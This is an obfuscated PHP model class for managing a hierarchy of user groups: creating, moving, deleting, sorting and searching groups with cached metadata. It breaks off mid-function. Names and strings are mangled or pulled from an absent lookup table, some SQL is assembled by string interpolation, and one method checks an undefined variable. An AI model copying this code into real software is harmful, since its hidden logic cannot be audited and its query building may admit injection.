<?php
 goto f„ùÖéØÑ; CíÃÆŠâ†å: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\165\160"; protected $tableMeta = array("\164\x61\142\x6c\145\116\141\x6d\145" => "\147\162\x6f\165\x70\x5f\x6d\x65\164\x61", "\155\145\164\141\x46\x69\145\x6c\x64" => "\x67\162\x6f\x75\x70\x49\x44"); protected function cacheFunctionAlias($§Í–ÇºŞ) { $É¹’±÷Ê =& $_SERVER[Ü©»’·]; return array($É¹’±÷Ê[1936] => array($§Í–ÇºŞ[0], $É¹’±÷Ê[1937]), $É¹’±÷Ê[1938] => array($§Í–ÇºŞ[0], $É¹’±÷Ê[1939])); } protected function getInfo($ØÂ½Ü³¼, $Å¥ŒõœĞ = false) { $°ÁŠ›ú÷ = $this->getInfoSimple($ØÂ½Ü³¼); if (!$°ÁŠ›ú÷) { return !1; } if ($Å¥ŒõœĞ) { return $this->_listDataApplyItem($°ÁŠ›ú÷); } return $this->cacheFunctionGet($_SERVER[Ü©»’·][1940], $ØÂ½Ü³¼); } protected function getInfoSimple($¦·ˆ©õã, $è‚Ÿ Ï = false) { $§ÇÏ€ı÷ =& $_SERVER[Ü©»’·]; if ($è‚Ÿ Ï) { $¿™•—ğ» = array($§ÇÏ€ı÷[1858] => intval($¦·ˆ©õã)); $™Ãü®­… = $this->where($¿™•—ğ»)->find(); return is_array($™Ãü®­…) ? $™Ãü®­… : array(); } return $this->cacheFunctionGet($§ÇÏ€ı÷[1941], $¦·ˆ©õã); } protected function groupAdd($ı»±É°š) { $ªğŞï€ =& $_SERVER[Ü©»’·]; if (!$ı»±É°š[$ªğŞï€[441]] && isset($ı»±É°š[$ªğŞï€[1858]]) && $ı»±É°š[$ªğŞï€[1858]] == 1) { if ($‘½ÎÖ–Ù = $this->getInfoSimple($ı»±É°š[$ªğŞï€[1858]], !0)) { return $ı»±É°š[$ªğŞï€[1858]]; } } else { $‘½ÎÖ–Ù = $this->getInfoSimple($ı»±É°š[$ªğŞï€[441]]); if (!$‘½ÎÖ–Ù) { return !1; } } $ĞõÉ“€û = $ªğŞï€[540]; if ($‘½ÎÖ–Ù[$ªğŞï€[530]]) { $ĞõÉ“€û = $‘½ÎÖ–Ù[$ªğŞï€[530]] . $‘½ÎÖ–Ù[$ªğŞï€[1858]] . $ªğŞï€[50]; } $ñ‘ÜË®ö = array($ªğŞï€[429] => $this->groupNameAuto($ı»±É°š[$ªğŞï€[441]], $ı»±É°š[$ªğŞï€[32]]), $ªğŞï€[410] => $ı»±É°š[$ªğŞï€[441]], $ªğŞï€[599] => $ĞõÉ“€û, $ªğŞï€[1942] => $ı»±É°š[$ªğŞï€[1845]], $ªğŞï€[1943] => 0, $ªğŞï€[1862] => 0); if (isset($ı»±É°š[$ªğŞï€[1882]])) { $ñ‘ÜË®ö[$ªğŞï€[1882]] = $ı»±É°š[$ªğŞï€[1882]]; } else { $šøôÈÕÑ = $this->max($ªğŞï€[1882]); if (!$šøôÈÕÑ) { $šøôÈÕÑ = 0; } $ñ‘ÜË®ö[$ªğŞï€[1882]] = $šøôÈÕÑ + 1; } if (!empty($ı»±É°š[$ªğŞï€[1858]])) { $ñ‘ÜË®ö[$ªğŞï€[1858]] = $ı»±É°š[$ªğŞï€[1858]]; } $ëè™Ö‚ö = $this->add($ñ‘ÜË®ö); $this->setNamePinyin($ëè™Ö‚ö, $ñ‘ÜË®ö[$ªğŞï€[32]]); if (isset($ı»±É°š[$ªğŞï€[1944]])) { $this->metaSet($ëè™Ö‚ö, array($ªğŞï€[1944] => $ı»±É°š[$ªğŞï€[1944]], $ªğŞï€[1945] => $ı»±É°š[$ªğŞï€[1945]])); unset($ı»±É°š[$ªğŞï€[1944]]); unset($ı»±É°š[$ªğŞï€[1945]]); } Model($ªğŞï€[1339])->groupRootAdd($ëè™Ö‚ö); return $ëè™Ö‚ö; } protected function groupEdit($¢ºØÌ¦â, $ß”ıÀÂ) { $ğóÚÕ =& $_SERVER[Ü©»’·]; $€£÷¦¯œ = $this->getInfoSimple($¢ºØÌ¦â); if (!$€£÷¦¯œ) { return !1; } if (!empty($ß”ıÀÂ[$ğóÚÕ[441]])) { $Í™üÉÊ = $this->getInfoSimple($ß”ıÀÂ[$ğóÚÕ[441]]); if (!$Í™üÉÊ) { return !1; } if ($€£÷¦¯œ[$ğóÚÕ[1858]] == $Í™üÉÊ[$ğóÚÕ[1858]]) { return !1; } if ($ß”ıÀÂ[$ğóÚÕ[441]] != $€£÷¦¯œ[$ğóÚÕ[441]]) { if ($Í™üÉÊ[$ğóÚÕ[530]] !== $€£÷¦¯œ[$ğóÚÕ[530]] && strpos($Í™üÉÊ[$ğóÚÕ[530]], $€£÷¦¯œ[$ğóÚÕ[530]] . $€£÷¦¯œ[$ğóÚÕ[1858]] . $ğóÚÕ[50]) === 0) { return !1; } $ß”ıÀÂ[$ğóÚÕ[599]] = $Í™üÉÊ[$ğóÚÕ[530]] . $ß”ıÀÂ[$ğóÚÕ[441]] . $ğóÚÕ[50]; $this->_changeChildLevel($€£÷¦¯œ, $Í™üÉÊ); } } if (isset($ß”ıÀÂ[$ğóÚÕ[32]])) { $this->setNamePinyin($¢ºØÌ¦â, $ß”ıÀÂ[$ğóÚÕ[32]]); } if (isset($ß”ıÀÂ[$ğóÚÕ[1944]])) { $this->metaSet($¢ºØÌ¦â, array($ğóÚÕ[1944] => $ß”ıÀÂ[$ğóÚÕ[1944]], $ğóÚÕ[1945] => $ß”ıÀÂ[$ğóÚÕ[1945]])); unset($ß”ıÀÂ[$ğóÚÕ[1944]]); unset($ß”ıÀÂ[$ğóÚÕ[1945]]); } $this->_clearChildrenCache($€£÷¦¯œ); return $this->where(array($ğóÚÕ[1946] => $¢ºØÌ¦â))->save($ß”ıÀÂ); } private function _clearChildrenCache($áĞÊí¤) { $°²¡í =& $_SERVER[Ü©»’·]; $Ä ŞÚŒœ = array($°²¡í[599] => array($°²¡í[559], $áĞÊí¤[$°²¡í[530]] . $áĞÊí¤[$°²¡í[1858]] . $°²¡í[560])); $µÁá³¬ã = $this->field($°²¡í[1858])->where($Ä ŞÚŒœ)->select(); foreach ($µÁá³¬ã as $›ÍõÙ×î) { $this->_clearCache($›ÍõÙ×î[$°²¡í[1858]]); } } private function _clearCache($€’ÇÒ³Æ) { $™Ñ˜ ©ö =& $_SERVER[Ü©»’·]; $this->cacheFunctionClear($™Ñ˜ ©ö[1940], $€’ÇÒ³Æ); $this->cacheFunctionClear($™Ñ˜ ©ö[1941], $€’ÇÒ³Æ); } private function _changeChildLevel($¼ªñ¦™î, $ôì¾ö¨², $Ñï‘ğò = false) { $™é­¡ËÂ =& $_SERVER[Ü©»’·]; $ŸÉÑ‚€È = $¼ªñ¦™î[$™é­¡ËÂ[530]] . $¼ªñ¦™î[$™é­¡ËÂ[1858]] . $™é­¡ËÂ[50]; $¸ÖîËùÖ = $ôì¾ö¨²[$™é­¡ËÂ[530]] . $ôì¾ö¨²[$™é­¡ËÂ[1858]] . $™é­¡ËÂ[50] . $¼ªñ¦™î[$™é­¡ËÂ[1858]] . $™é­¡ËÂ[50]; if ($Ñï‘ğò) { $¸ÖîËùÖ = $ôì¾ö¨²[$™é­¡ËÂ[530]] . $ôì¾ö¨²[$™é­¡ËÂ[1858]] . $™é­¡ËÂ[50]; } $Àí€â´ = array($™é­¡ËÂ[599] => array($™é­¡ËÂ[559], $¼ªñ¦™î[$™é­¡ËÂ[530]] . $¼ªñ¦™î[$™é­¡ËÂ[1858]] . $™é­¡ËÂ[560])); $È™½»— = array($™é­¡ËÂ[599] => array($™é­¡ËÂ[608], "\x72\145\x70\x6c\141\x63\x65\50\x70\x61\162\145\x6e\164\x4c\145\x76\145\x6c\54\x27{$ŸÉÑ‚€È}\47\54\47{$¸ÖîËùÖ}\x27\x29")); $this->_clearChildrenCache($¼ªñ¦™î); $this->where($Àí€â´)->data($È™½»—)->save(); } public function setNamePinyin($’‘ŠÆ¬¯, $ÈŞù¡©€ = false) { $ı³ÕÆÜ­ =& $_SERVER[Ü©»’·]; if (!$ÈŞù¡©€) { $ˆÍÄ¸ÎÙ = $this->getInfoSimple($’‘ŠÆ¬¯); $ÈŞù¡©€ = $ˆÍÄ¸ÎÙ[$ı³ÕÆÜ­[32]]; } if (!Input::check($ÈŞù¡©€, $ı³ÕÆÜ­[602])) { $this->metaSet($’‘ŠÆ¬¯, $ı³ÕÆÜ­[474], null); $this->metaSet($’‘ŠÆ¬¯, $ı³ÕÆÜ­[473], null); return; } $Ğ÷ÄäÙˆ = array($ı³ÕÆÜ­[474] => str_replace($ı³ÕÆÜ­[53], $ı³ÕÆÜ­[12], Pinyin::get($ÈŞù¡©€)), $ı³ÕÆÜ­[473] => Pinyin::get($ÈŞù¡©€, $ı³ÕÆÜ­[603])); $this->metaSet($’‘ŠÆ¬¯, $Ğ÷ÄäÙˆ); } protected function groupStatus($ê­îÚëÒ, $Ğš”×€¦) { $éÂÈŸÒ° =& $_SERVER[Ü©»’·]; $ü¬¼”»± = $this->getInfoSimple($ê­îÚëÒ); if (!$ü¬¼”»±) { return !1; } if ($Ğš”×€¦ == $éÂÈŸÒ°[88]) { $œé•‘äÛ = $this->parentLevelArray($ü¬¼”»±[$éÂÈŸÒ°[530]]); } else { $šãï”·Ê = array($éÂÈŸÒ°[599] => array($éÂÈŸÒ°[559], $ü¬¼”»±[$éÂÈŸÒ°[530]] . $ü¬¼”»±[$éÂÈŸÒ°[1858]] . $éÂÈŸÒ°[560])); $œé•‘äÛ = $this->where($šãï”·Ê)->field($éÂÈŸÒ°[1858])->select(); $œé•‘äÛ = array_to_keyvalue($œé•‘äÛ, $éÂÈŸÒ°[12], $éÂÈŸÒ°[1858]); } $œé•‘äÛ[] = $ü¬¼”»±[$éÂÈŸÒ°[1858]]; $Ÿİ¢Ğ§± = array(); foreach ($œé•‘äÛ as $ê­îÚëÒ) { $Ÿİ¢Ğ§±[] = array($éÂÈŸÒ°[1858] => $ê­îÚëÒ, $éÂÈŸÒ°[94] => $éÂÈŸÒ°[756], $éÂÈŸÒ°[383] => $Ğš”×€¦); $this->_clearCache($ê­îÚëÒ); } return Model($éÂÈŸÒ°[1947])->addAll($Ÿİ¢Ğ§±, array(), !0); } protected function groupRemove($Ãîæ‘â¤, $÷¥îøÓ» = false) { $¯Ú÷¦Á— =& $_SERVER[Ü©»’·]; $Ç§û®–È = array($¯Ú÷¦Á—[1858] => $Ãîæ‘â¤); $Ş´š¶¨ñ = $this->where($Ç§û®–È)->find(); if (!$Ş´š¶¨ñ || $Ş´š¶¨ñ[$¯Ú÷¦Á—[441]] == 0) { return !1; } if (!$÷¥îøÓ») { $ĞÈ¬Ñı² = $this->getInfoSimple($Ş´š¶¨ñ[$¯Ú÷¦Á—[441]]); $this->_changeChildLevel($Ş´š¶¨ñ, $ĞÈ¬Ñı², !0); $this->where(array($¯Ú÷¦Á—[441] => $Ãîæ‘â¤))->save(array($¯Ú÷¦Á—[441] => $Ş´š¶¨ñ[$¯Ú÷¦Á—[441]])); } Model($¯Ú÷¦Á—[1947])->where($Ç§û®–È)->delete(); Model($¯Ú÷¦Á—[1948])->where($Ç§û®–È)->delete(); Model($¯Ú÷¦Á—[831])->groupRootRemove($Ãîæ‘â¤); return $this->where($Ç§û®–È)->delete(); } protected function groupSort($²·ÎÏô) { $„ì×ö²ñ =& $_SERVER[Ü©»’·]; $¨Ş¼‹Ã = array(); foreach ($²·ÎÏô as $¸û¢ÊÍ => $ÃÖ´êÒ±) { $¨Ş¼‹Ã[] = array($„ì×ö²ñ[1858], $ÃÖ´êÒ±, $„ì×ö²ñ[1882], $¸û¢ÊÍ + 1); } $this->saveAll($¨Ş¼‹Ã); } public function listData() { $ì‘Šä¨Ã = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ì‘Šä¨Ã[$_SERVER[Ü©»’·][378]]); return $ì‘Šä¨Ã; } private function _makeOrder($×ö×®Ï = '') { $ûáÀîü =& $_SERVER[Ü©»’·]; $ƒ„‚ğŸ‘ = array($ûáÀîü[1858], $ûáÀîü[32], $ûáÀîü[1847], $ûáÀîü[200]); $«œèø¤Ã = array($ûáÀîü[459] => $ûáÀîü[460], $ûáÀîü[461] => $ûáÀîü[462]); $èŞÉÕìÙ = Input::get($ûáÀîü[466], $ûáÀîü[7], $ûáÀîü[1862], $ƒ„‚ğŸ‘); $ªÊêì‹ = Input::get($ûáÀîü[467], $ûáÀîü[7], $ûáÀîü[1949], array($ûáÀîü[1949], $ûáÀîü[461])); $ªÊêì‹ = $«œèø¤Ã[$ªÊêì‹]; $×ö×®Ï = $×ö×®Ï . "{$èŞÉÕìÙ}\40{$ªÊêì‹}\54\x20\147\162\157\x75\x70\x49\x44\x20\141\x73\x63"; return $this->order($×ö×®Ï); } public function listChild($Ùö€ûË¬) { $¬Æ×Øı =& $_SERVER[Ü©»’·]; $³®Ò = $this->where(array($¬Æ×Øı[441] => $Ùö€ûË¬))->_makeOrder()->selectPage(200); $this->_listDataApply($³®Ò[$¬Æ×Øı[378]]); return $³®Ò; } public function listChildIds($³İïŸôü) { $çû»Ê‘ö =& $_SERVER[Ü©»’·]; if (is_string($İœˆ‡ºÒ)) { $³İïŸôü = explode($çû»Ê‘ö[50], $³İïŸôü); } $œ÷ô÷İÌ = $this->where(array($çû»Ê‘ö[1858] => array($çû»Ê‘ö[7], $³İïŸôü)))->field($çû»Ê‘ö[1950])->select(); if (!$œ÷ô÷İÌ) { return !1; } $‹“ Ã¦ = array(); foreach ($œ÷ô÷İÌ as $¬‡ıÊ²¥) { $‹“ Ã¦[] = "\x73\x65\154\145\x63\x74\40\147\x72\x6f\x75\x70\111\x44\40\x66\162\157\x6d\40\140\x67\x72\x6f\x75\160\140\40\167\150\145\162\x65\40\x70\x61\x72\x65\156\164\114\145\x76\x65\154\40\x6c\151\x6b\x65\x20\x27{$¬‡ıÊ²¥[$çû»Ê‘ö[530]]}{$¬‡ıÊ²¥[$çû»Ê‘ö[1858]]}\54\x25\x27"; } $‹“ Ã¦ = implode($çû»Ê‘ö[1951], $‹“ Ã¦); $œ÷ô÷İÌ = $this->query($‹“ Ã¦); if (!$œ÷ô÷İÌ) { return array(); } $³İïŸôü = array_to_keyvalue($œ÷ô÷İÌ, $çû»Ê‘ö[12], $çû»Ê‘ö[1858]); return array_unique($³İïŸôü); } public function listByID($–ûï¡Á®) { $ªÅ½»×Á =& $_SERVER[Ü©»’·]; if (!$–ûï¡Á®) { return array(); } $Ìû‰¶ıı = array($ªÅ½»×Á[1858] => array($ªÅ½»×Á[7], $–ûï¡Á®)); $œá¨ê = $this->where($Ìû‰¶ıı)->select(); $œá¨ê = array_sort_keep($œá¨ê, $ªÅ½»×Á[1858], $–ûï¡Á®); $this->_listDataApply($œá¨ê); return $œá¨ê; } public function listSearch($…èÜ–ùø) { $º®ÄÂÓ =& $_SERVER[Ü©»’·]; $à•öÚì = $…èÜ–ùø[$º®ÄÂÓ[1952]]; $ùÙ‚†±² = isset($…èÜ–ùø[$º®ÄÂÓ[1953]]) ? $…èÜ–ùø[$º®ÄÂÓ[1953]] : !1; if (!trim($à•öÚì)) { return !1; } $à•öÚì = str_replace($º®ÄÂÓ[1954], $º®ÄÂÓ[1955], $à•öÚì); $ØÉô›¦¤ = array($º®ÄÂÓ[1858] => array($º®ÄÂÓ[392], "{$à•öÚì}\x25"), $º®ÄÂÓ[32] => array($º®ÄÂÓ[392], "\45{$à•öÚì}\x25"), $º®ÄÂÓ[1003] => $º®ÄÂÓ[1956]); if ($ùÙ‚†±²) { $ÃÏäÓî = $this->getInfoSimple($ùÙ‚†±²); $í¦ªšøĞ = $ÃÏäÓî[$º®ÄÂÓ[530]] . $ùÙ‚†±² . $º®ÄÂÓ[560]; $ØÉô›¦¤ = array($ØÉô›¦¤, array($º®ÄÂÓ[530] => array($º®ÄÂÓ[392], $í¦ªšøĞ))); } $ØÉô›¦¤ = $this->parseWhereLike($ØÉô›¦¤); $¦ğŠı­ = $this->_makeOrder()->where($ØÉô›¦¤)->selectPage(20); $¦ğŠı­ = $¦ğŠı­ ? $¦ğŠı­ : array($º®ÄÂÓ[378] => array(), $º®ÄÂÓ[375] => array()); if (!$¦ğŠı­ || count($¦ğŠı­[$º®ÄÂÓ[378]]) < 5 && Input::check($à•öÚì, $º®ÄÂÓ[318])) { $³á´× = $this->groupChildrenAll($ùÙ‚†±²); $É·›ÏìÒ = $this->_searchFromMeta($º®ÄÂÓ[473], $à•öÚì, 10, $³á´×); $ËÍÙ©º† = $this->_searchFromMeta($º®ÄÂÓ[474], $à•öÚì, 10, $³á´×); $³ŞÊ„Íí = array_merge($É·›ÏìÒ, $ËÍÙ©º†, $¦ğŠı­[$º®ÄÂÓ[378]]); $¦ğŠı­[$º®ÄÂÓ[378]] = array_unique_by_key($³ŞÊ„Íí, $º®ÄÂÓ[1858]); $¦ğŠı­[$º®ÄÂÓ[375]][$º®ÄÂÓ[376]] = count($¦ğŠı­[$º®ÄÂÓ[378]]); $¦ğŠı­[$º®ÄÂÓ[375]][$º®ÄÂÓ[377]] = ceil($¦ğŠı­[$º®ÄÂÓ[375]][$º®ÄÂÓ[376]] / $¦ğŠı­[$º®ÄÂÓ[375]][$º®ÄÂÓ[372]]); } $this->_listDataApply($¦ğŠı­[$º®ÄÂÓ[378]]); return $¦ğŠı­; } protected function groupChildrenAll($ ùÇ›Ê­) { $ƒ†ÔåÒ‚ =& $_SERVER[Ü©»’·]; if (!$ ùÇ›Ê­) { return !1; } if (is_string($ ùÇ›Ê­)) { $ ùÇ›Ê­ = array($ ùÇ›Ê­); } $›É¢øÂ = $ ùÇ›Ê­; foreach ($ ùÇ›Ê­ as $‰Ğ‚é³ö) { $ãÄıŞÌ = $this->getInfoSimple($‰Ğ‚é³ö); $Â¦ìÄøš = array($ƒ†ÔåÒ‚[530] => array($ƒ†ÔåÒ‚[392], $ãÄıŞÌ[$ƒ†ÔåÒ‚[530]] . $‰Ğ‚é³ö . $ƒ†ÔåÒ‚[560])); $Øàãøíì = $this->field($ƒ†ÔåÒ‚[1858])->where($Â¦ìÄøš)->select(); $›É¢øÂ = array_merge($›É¢øÂ, array_to_keyvalue($Øàãøíì, $ƒ†ÔåÒ‚[12], $ƒ†ÔåÒ‚[1858])); } return array_unique($›É¢øÂ); } private function _searchFromMeta($÷ĞˆßØ, $³Æ«¹°á, $“Ğ¨Ã³», $£ùš®¶) { $ŠŠ¦ºÖ =& $_SERVER[Ü©»’·]; $³Æ«¹°á = strtolower($³Æ«¹°á); $’¢é•ñê = array($ŠŠ¦ºÖ[94] => $÷ĞˆßØ, $ŠŠ¦ºÖ[383] => array($ŠŠ¦ºÖ[392], "\45{$³Æ«¹°á}\45")); $’¢é•ñê = $this->parseWhereLike($’¢é•ñê); if ($£ùš®¶) { $’¢é•ñê[$ŠŠ¦ºÖ[1858]] = array($ŠŠ¦ºÖ[7], $£ùš®¶); } $ ıàÙ‚Ñ = Model($ŠŠ¦ºÖ[1957])->where($’¢é•ñê)->limit($“Ğ¨Ã³»)->select(); if (!$ ıàÙ‚Ñ) { return array(); } $ ıàÙ‚Ñ = array_to_keyvalue($ ıàÙ‚Ñ, $ŠŠ¦ºÖ[12], $ŠŠ¦ºÖ[1858]); $’Ö¾Ÿê = $this->where(array($ŠŠ¦ºÖ[1946] => array($ŠŠ¦ºÖ[7], $ ıàÙ‚Ñ)))->select(); if (!$’Ö¾Ÿê) { return array(); } return $’Ö¾Ÿê; } protected function _listDataApplyItem($ğÚ¿îÌÕ) { $‚Ñ²Á˜à = array($ğÚ¿îÌÕ); $this->_listDataApply($‚Ñ²Á˜à); return $‚Ñ²Á˜à[0]; } protected function _listDataApply(&$œò¹Ç•©) { $¾ƒ›²µ =& $_SERVER[Ü©»’·]; if (!$œò¹Ç•©) { return; } $ûü—Ç…™ = array_to_keyvalue($œò¹Ç•©, $¾ƒ›²µ[12], $¾ƒ›²µ[1858]); $this->_listAppendChildren($œò¹Ç•©); $this->_listAppendChildrenMember($œò¹Ç•©); $this->_listAppendMeta($œò¹Ç•©, $ûü—Ç…™); $this->_listAppendParent($œò¹Ç•©); $this->_listAppendSourceRoot($œò¹Ç•©, $ûü—Ç…™); } private function _listAppendChildren(&$¶§ø¬») { $áÅ‡Ÿ¤Ş =& $_SERVER[Ü©»’·]; $ƒÂÅìÊ† = array_to_keyvalue($¶§ø¬», $áÅ‡Ÿ¤Ş[12], $áÅ‡Ÿ¤Ş[1858]); $´Ô³ˆÆ± = array($áÅ‡Ÿ¤Ş[441] => array($áÅ‡Ÿ¤Ş[7], $ƒÂÅìÊ†)); $ù“‡ÇÏ’ = array($áÅ‡Ÿ¤Ş[441], $áÅ‡Ÿ¤Ş[1958] => $áÅ‡Ÿ¤Ş[509]); $õÆ†£²‘ = $this->field($ù“‡ÇÏ’)->where($´Ô³ˆÆ±)->group($áÅ‡Ÿ¤Ş[441])->select(); $ ¡ÇÆ¥À = array_to_keyvalue($õÆ†£²‘, $áÅ‡Ÿ¤Ş[441], $áÅ‡Ÿ¤Ş[509]); foreach ($¶§ø¬» as &$Şß®ËŞ) { $†€÷Û‹˜ = $Şß®ËŞ[$áÅ‡Ÿ¤Ş[1858]]; $Şß®ËŞ[$áÅ‡Ÿ¤Ş[1959]] = isset($ ¡ÇÆ¥À[$†€÷Û‹˜]) ? intval($ ¡ÇÆ¥À[$†€÷Û‹˜]) : !1; } unset($Şß®ËŞ); } private function _listAppendChildrenMember(&$¿çèÑÔÄ) { $ä¨º…¤• =& $_SERVER[Ü©»’·]; $‹ö®¸ÁÀ = array_to_keyvalue($¿çèÑÔÄ, $ä¨º…¤•[12], $ä¨º…¤•[1858]); $ğ«˜¨Š¹ = array($ä¨º…¤•[1858] => array($ä¨º…¤•[7], $‹ö®¸ÁÀ)); $Üâœ£äî = array($ä¨º…¤•[1858], $ä¨º…¤•[1958] => $ä¨º…¤•[509]); $ƒË„åğ½ = Model($ä¨º…¤•[1948])->field($Üâœ£äî)->where($ğ«˜¨Š¹)->group($ä¨º…¤•[1858])->select(); $æáéøŞÒ = array_to_keyvalue($ƒË„åğ½, $ä¨º…¤•[1858], $ä¨º…¤•[509]); foreach ($¿çèÑÔÄ as &$¡Ï´Ä¬) { $™ƒ¯Î¹× = $¡Ï´Ä¬[$ä¨º…¤•[1858]]; $¡Ï´Ä¬[$ä¨º…¤•[1960]] = isset($æáéøŞÒ[$™ƒ¯Î¹×]) ? intval($æáéøŞÒ[$™ƒ¯Î¹×]) : !1; } unset($¡Ï´Ä¬); } private function _listAppendMeta(&$ ¹Ó’Ó, $Ãüù¨ë¾) { $º›¿…¦ñ =& $_SERVER[Ü©»’·]; $½¬‡½À× = array($º›¿…¦ñ[1858] => array($º›¿…¦ñ[7], $Ãüù¨ë¾)); $ÌÍÏ®›É = Model($º›¿…¦ñ[1947])->where($½¬‡½À×)->select(); $ÌÍÏ®›É = array_to_keyvalue_group($ÌÍÏ®›É, $º›¿…¦ñ[1858]); foreach ($ÌÍÏ®›É as &$•¶Ô²·Ì) { $•¶Ô²·Ì = array_to_keyvalue($•¶Ô²·Ì, $º›¿…¦ñ[94], $º›¿…¦ñ[383]); } unset($•¶Ô²·Ì); foreach ($ ¹Ó’Ó as &$¸Ìñı²Å) { $¸Ìñı²Å[$º›¿…¦ñ[475]] = array(); if (isset($ÌÍÏ®›É[$¸Ìñı²Å[$º›¿…¦ñ[1858]]])) { $¸Ìñı²Å[$º›¿…¦ñ[475]] = $ÌÍÏ®›É[$¸Ìñı²Å[$º›¿…¦ñ[1858]]]; } } unset($¸Ìñı²Å); } protected function parentLevelArray($üµÜíª) { $¸îêºõê =& $_SERVER[Ü©»’·]; $üµÜíª = explode($¸îêºõê[50], trim($üµÜíª, $¸îêºõê[50])); $üµÜíª = array_remove_value($üµÜíª, $¸îêºõê[197]); return $üµÜíª; } protected function parentInGroup($ıê‘¼Æ, $©¼µàÛä) { $°çæ©ÔÜ =& $_SERVER[Ü©»’·]; $áÕ¸ã¯í = $this->getInfoSimple($ıê‘¼Æ); if (!$áÕ¸ã¯í) { return !0; } $ôì¸ç = $this->parentLevelArray($áÕ¸ã¯í[$°çæ©ÔÜ[530]]); $ôì¸ç[] = $ıê‘¼Æ; foreach ($ôì¸ç as $ıê‘¼Æ) { if (in_array($ıê‘¼Æ . $°çæ©ÔÜ[12], $©¼µàÛä)) { return !0; } } return !1; } private function _listAppendParent(&$ƒÓ±Õ¢—) { $·ÖÙ—Ô =& $_SERVER[Ü©»’·]; $¿Øë¡æ = array(); foreach ($ƒÓ±Õ¢— as &$¢İá¦À) { $¿Øë¡æ[$¢İá¦À[$·ÖÙ—Ô[1858]]] = $¢İá¦À[$·ÖÙ—Ô[32]]; $ÚéĞøˆî = $this->parentLevelArray($¢İá¦À[$·ÖÙ—Ô[530]]); foreach ($ÚéĞøˆî as $Èöù©Õ) { if (!isset($¿Øë¡æ[$Èöù©Õ])) { $¿Øë¡æ[$Èöù©Õ] = 0; } } } unset($¢İá¦À); foreach ($¿Øë¡æ as $øğáğ³ => $Æ´³¶Ğ±) { if ($Æ´³¶Ğ±) { continue; } $‚æ·Ù» = $this->getInfoSimple($øğáğ³); $¿Øë¡æ[$øğáğ³] = $‚æ·Ù»[$·ÖÙ—Ô[32]]; } $«ÜâÙ—Š = $GLOBALS[$·ÖÙ—Ô[6]][$·ÖÙ—Ô[89]][$·ÖÙ—Ô[1961]]; if ($GLOBALS[$·ÖÙ—Ô[512]] == $·ÖÙ—Ô[88]) { $«ÜâÙ—Š = !1; } foreach ($ƒÓ±Õ¢— as &$¢İá¦À) { $ÚéĞøˆî = $this->parentLevelArray($¢İá¦À[$·ÖÙ—Ô[530]]); $†ö»ö“· = $·ÖÙ—Ô[12]; foreach ($ÚéĞøˆî as $øğáğ³ => $Èöù©Õ) { if ($«ÜâÙ—Š && $øğáğ³ == 0) { continue; } $†ö»ö“· .= $¿Øë¡æ[$Èöù©Õ] . $·ÖÙ—Ô[8]; } if ($ÚéĞøˆî) { $†ö»ö“· .= $¢İá¦À[$·ÖÙ—Ô[32]]; } $¢İá¦À[$·ÖÙ—Ô[535]] = str_replace($·ÖÙ—Ô[538], $·ÖÙ—Ô[8], $†ö»ö“·); } unset($¢İá¦À); } private function _listAppendSourceRoot(&$Ç¼ıé¢, $ÓôÙŒüË) { $¿¤Ëšıı =& $_SERVER[Ü©»’·]; $ñ¸¯‡Ÿ = Model($¿¤Ëšıı[831])->listSourceRoot(SourceModel::TYPE_GROUP, $ÓôÙŒüË); $ñ¸¯‡Ÿ = array_to_keyvalue($ñ¸¯‡Ÿ, $¿¤Ëšıı[514]); $ñ¸¯‡Ÿ = array_remove_key($ñ¸¯‡Ÿ, $¿¤Ëšıı[514]); foreach ($Ç¼ıé¢ as &$”ÀÆúñ) { $”ÀÆúñ[$¿¤Ëšıı[86]] = $ñ¸¯‡Ÿ[$”ÀÆúñ[$¿¤Ëšıı[1858]]] ? $ñ¸¯‡Ÿ[$”ÀÆúñ[$¿¤Ëšıı[1858]]] : array(); } unset($”ÀÆúñ); } protected function groupMerge($´‡ùúÇ) { $´‡ùúÇ = array_values(array_unique($´‡ùúÇ)); $â¾â³ÚŠ = array(); for ($×ĞÉÚ“ş = 0; $×ĞÉÚ“ş < count($´‡ùúÇ); $×ĞÉÚ“ş++) { $Úú„±š = !1; for ($¿àÅÏØ = 0; $¿àÅÏØ < count($´‡ùúÇ); $¿àÅÏØ++) { if ($×ĞÉÚ“ş == $¿àÅÏØ) { continue; } if ($this->isParentOf($´‡ùúÇ[$¿àÅÏØ], $´‡ùúÇ[$×ĞÉÚ“ş])) { $Úú„±š = !0; break; } } if (!$Úú„±š) { $â¾â³ÚŠ[] = $´‡ùúÇ[$×ĞÉÚ“ş]; } } return $â¾â³ÚŠ; } protected function isParentOf($´¢Õ‹ê, $µ¦¿„¿ç) { $¤Ê½¶ûã =& $_SERVER[Ü©»’·]; if (!$´¢Õ‹ê || !$µ¦¿„¿ç || $´¢Õ‹ê == $µ¦¿„¿ç) { return !1; } $ÙÌá‰Ò• = $this->getInfoSimple($´¢Õ‹ê); $×ÎßŒ×· = $this->getInfoSimple($µ¦¿„¿ç); $ë¡Õëºô = $ÙÌá‰Ò•[$¤Ê½¶ûã[530]] . $´¢Õ‹ê . $¤Ê½¶ûã[50]; if (substr($×ÎßŒ×·[$¤Ê½¶ûã[530]], 0, strlen($ë¡Õëºô)) == $ë¡Õëºô) { return !0; } return !1; } public function groupShowRoot($¸€œ¬ª, $…‰·Å·• = false) { $×¥êé =& $_SERVER[Ü©»’·]; $…æ×”õ = $this->getInfo($¸€œ¬ª); if (!$…æ×”õ) { return array(); } $·ºÍ¹óÊ = $this->parentLevelArray($…æ×”õ[$×¥êé[530]]); $âİºĞ®¯ = array($¸€œ¬ª); if (count($·ºÍ¹óÊ) == 0) { return $âİºĞ®¯; } if ($…‰·Å·• && count($·ºÍ¹óÊ) == 1) { return $âİºĞ®¯; } if (!$…æ×”õ[$×¥êé[475]] || !isset($…æ×”õ[$×¥êé[475]][$×¥êé[1944]]) || $…æ×”õ[$×¥êé[475]][$×¥êé[1944]] == $×¥êé[1913]) { return $this->groupShowRoot($·ºÍ¹óÊ[count($·ºÍ¹óÊ) - 1], $…‰·Å·•); } if ($…æ×”õ[$×¥êé[475]][$×¥êé[1944]] == $×¥êé[366]) { $¸èğäÎå = explode($×¥êé[50], $…æ×”õ[$×¥êé[475]][$×¥êé[1945]]); if ($¸èğäÎå) { $âİºĞ®¯ = array_merge($âİºĞ®¯, $¸èğäÎå); } } return $âİºĞ®¯; } protected function resetParentLevel() { $–ŠæÌÛş =& $_SERVER[Ü©»’·]; $œ Šî®Á = $–ŠæÌÛş[1858]; 